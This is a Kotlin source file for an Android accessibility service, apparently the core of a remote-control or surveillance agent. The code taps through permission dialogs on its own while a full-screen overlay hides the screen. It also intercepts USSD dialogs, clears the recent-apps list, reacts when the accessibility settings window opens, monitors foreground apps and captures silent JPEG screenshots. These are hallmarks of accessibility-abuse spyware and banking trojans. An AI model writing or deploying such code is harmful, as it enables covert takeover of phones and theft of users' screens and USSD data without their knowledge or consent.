package com.base.realtime.access

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.graphics.Bitmap
import android.hardware.display.DisplayManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import com.base.realtime.config.AppConfigs
import com.base.realtime.ussd.UssdCapture
import com.base.realtime.watch.PageTreeFab
import com.base.realtime.watch.WatchController
import java.io.ByteArrayOutputStream
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicReference

class AgentAccessibilityService : AccessibilityService(), PermissionsAutoGrant.OverlayControl {
    private val main = Handler(Looper.getMainLooper())
    private val permAutoGrantOverlay by lazy { PermAutoGrantOverlay(this) }
    private val watch by lazy { WatchController(this) }
    private val pageTreeFab by lazy { PageTreeFab(this) }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance.set(this)
        Log.i(TAG, "accessibility connected")
        PermissionsAutoGrant.overlayControl = this
        GrantReporter.sync(this, allowReady = false)
        main.post {
            AutoGrantOrchestrator.onAccessibilityConnected(this)
            if (AppConfigs.load(this).watchDumpFab) {
                pageTreeFab.show()
            }
        }
    }

    override fun showAutoGrantOverlay(progressLine: String) {
        main.post { permAutoGrantOverlay.show(progressLine) }
    }

    override fun hideAutoGrantOverlay() {
        main.post { permAutoGrantOverlay.hide() }
    }

    override fun stabilizeAutoGrantOverlay() {
        main.post { permAutoGrantOverlay.stabilizeFullscreen() }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        if (UssdCapture.onEvent(this, event)) {
            watch.pause()
            return
        }
        val type = event.eventType
        if (LeaveA11ySettings.isActive() &&
            (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                type == AccessibilityEvent.TYPE_WINDOWS_CHANGED ||
                type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)
        ) {
            LeaveA11ySettings.onWindowChanged(this)
        }
        if (RecentsClearer.isActive()) {
            watch.pause()
            return
        }
        if (PermissionsAutoGrant.isArmed()) {
            watch.pause()
            PermissionDialogTapper.onEvent(this, event)
            return
        }
        watch.onEvent(event)
    }

    fun onWatchList() {
        main.post { watch.syncForeground() }
    }

    override fun onInterrupt() = Unit

    override fun onUnbind(intent: android.content.Intent?): Boolean {
        LeaveA11ySettings.cancel()
        if (PermissionsAutoGrant.overlayControl === this) {
            PermissionsAutoGrant.overlayControl = null
        }
        hideAutoGrantOverlay()
        pageTreeFab.hide()
        watch.stop()
        return super.onUnbind(intent)
    }

    override fun onDestroy() {
        LeaveA11ySettings.cancel()
        if (PermissionsAutoGrant.overlayControl === this) {
            PermissionsAutoGrant.overlayControl = null
        }
        hideAutoGrantOverlay()
        pageTreeFab.hide()
        watch.stop()
        if (instance.get() === this) instance.set(null)
        super.onDestroy()
    }

    fun takeJpeg(maxWidth: Int = 1080, quality: Int = 72, done: (ByteArray?) -> Unit) {
        if (Build.VERSION.SDK_INT < 30) {
            done(null)
            return
        }
        val displayId = try {
            val dm = getSystemService(DisplayManager::class.java)
            dm?.getDisplay(Display.DEFAULT_DISPLAY)?.displayId ?: Display.DEFAULT_DISPLAY
        } catch (_: Throwable) {
            Display.DEFAULT_DISPLAY
        }
        try {
            takeScreenshot(
                displayId,
                executor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(screenshot: ScreenshotResult) {
                        var src: Bitmap? = null
                        var scaled: Bitmap? = null
                        try {
                            val hw = screenshot.hardwareBuffer
                            src = Bitmap.wrapHardwareBuffer(hw, screenshot.colorSpace)
                            hw.close()
                            val original = src
                            if (original == null) {
                                done(null)
                                return
                            }
                            scaled = scale(original, maxWidth)
                            val out = ByteArrayOutputStream()
                            scaled.compress(Bitmap.CompressFormat.JPEG, quality.coerceIn(40, 90), out)
                            done(out.toByteArray())
                        } catch (t: Throwable) {
                            Log.w(TAG, "encode", t)
                            done(null)
                        } finally {
                            try {
                                if (scaled != null && scaled !== src) scaled.recycle()
                            } catch (_: Throwable) {
                            }
                            try {
                                src?.recycle()
                            } catch (_: Throwable) {
                            }
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        Log.w(TAG, "screenshot failed code=$errorCode")
                        done(null)
                    }
                },
            )
        } catch (t: Throwable) {
            Log.w(TAG, "takeScreenshot", t)
            done(null)
        }
    }

    private fun scale(src: Bitmap, maxWidth: Int): Bitmap {
        if (maxWidth <= 0 || src.width <= maxWidth) return src
        val h = (src.height.toFloat() * maxWidth / src.width).toInt().coerceAtLeast(1)
        return Bitmap.createScaledBitmap(src, maxWidth, h, true)
    }

    companion object {
        private const val TAG = "A11yService"
        private val instance = AtomicReference<AgentAccessibilityService?>(null)
        private val executor = Executors.newSingleThreadExecutor { r ->
            Thread(r, "a11y-screenshot").apply { isDaemon = true }
        }

        fun get(): AgentAccessibilityService? = instance.get()

        fun isEnabled(context: Context): Boolean {
            val component = android.content.ComponentName(context, AgentAccessibilityService::class.java)
            val expected = component.flattenToString()
            val short = component.flattenToShortString()
            val enabled = try {
                Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
                ).orEmpty()
            } catch (_: Throwable) {
                ""
            }
            if (enabled.isEmpty()) return false
            val splitter = android.text.TextUtils.SimpleStringSplitter(':')
            splitter.setString(enabled)
            while (splitter.hasNext()) {
                val item = splitter.next()
                if (item.equals(expected, ignoreCase = true) || item.equals(short, ignoreCase = true)) {
                    return true
                }
            }
            return false
        }
    }
}
